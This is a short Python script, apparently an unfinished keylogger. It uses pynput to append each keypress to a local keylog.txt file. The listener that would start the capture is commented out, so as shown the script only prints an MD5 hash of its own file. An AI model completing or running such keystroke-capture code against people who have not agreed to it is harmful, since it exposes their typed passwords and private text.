#!/usr/bin/env python3

from pynput.keyboard import Key, Listener
import hashlib

def check_hash():
    hash = hashlib.md5(open("keylogger.py", "rb").read()).hexdigest()
    print(hash)

def p_engine():
    print("placeholder")

def on_press(key):
    # record keystrokes
    f = open("keylog.txt", "a")
    f.write(str(key))
    print(key)

'''
with Listener(
        on_press=on_press
) as listener:
    listener.join()
'''

# f.close()
check_hash()
